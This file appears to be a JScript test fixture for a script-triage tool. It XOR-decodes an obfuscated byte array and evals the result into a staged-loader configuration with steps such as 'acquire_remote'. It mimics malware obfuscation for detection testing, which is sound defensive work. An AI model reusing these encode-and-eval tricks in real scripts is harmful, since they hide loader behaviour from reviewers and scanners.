// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_5ae1d45b = function decode_5ae1d45b_body(v_a19c) {
  var v_b27e = [];
  var previous = 11;
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push(v_a19c[i] ^ previous); previous = v_a19c[i]; }
  return v_b27e;
};
var recover_ebd1202c = function recover_ebd1202c_body() {
  if (true) {
    var v_a19c = [62,67,113,75,105,29,115,6,105,42,79,40,73,61,78,108,64,61,31,39,18,34,23,37,67,32,67,39,19,60,94,63,115,0,115,22,100,16,126,11,67,97,91,121,13,99,6,97,0,95,45,72,59,78,108,64,98,22,119,19,61,88,107,14,62,8,105,15,62,17,117,28,112,17,103,9,96,78,43,71,55,90,59,67,38,8,48,5,53,0,50,84,55,84,48,4,43,4,62,77,61,73,61,85,119,77,111,3,113,4,38,10,40,16,37,21,32,18,116,23,116,16,36,9,103,0,105,8,120,21,116,23,53,15,45,73,32,127,17,118,31,126,14,99,2,97,67,56,2,32,83,54,67,47,78,56,26,54,20,68,16,68,12,64,13,85,123,15,105,6,117,26,104,11,98,47,13,55,21,103,2,118,6,103,3,98,64,108,49,19,106,24,119,26,127,18,77,37,70,50,83,35,80,57,93,127,83,113,20,96,15,98,7,117,42,79,61,84,33,80,51,82,112,43,17,51,64,48,85,33,82,112];
    v_a19c.reverse();
    var v_f602 = ["north", "south"].join(":");
    var v_b27e = [];
    var state = 1;
    switch (state) { case 1: v_b27e = decode_5ae1d45b.apply(null, [v_a19c]); break; default: v_b27e = []; }
    var textParts;
    textParts = [];
    for (var bi = 0; bi < v_b27e.length; bi++) { textParts.push(String.fromCharCode(v_b27e[bi])); }
    var v_c304 = textParts.join("");
    return v_c304;
  }
};
var inspect_72a7b23f = function inspect_72a7b23f_body() {
  var v_d41a = eval("(" + recover_ebd1202c.apply(null, []) + ")");
  var v_e598 = new Object();
  v_e598["steps"] = v_d41a["steps"];
  v_e598["adapter"] = v_d41a["adapter"];
  v_e598["values"] = v_d41a["values"];
  v_e598["stageCount"] = v_d41a["stageCount"];
  return v_e598;
};
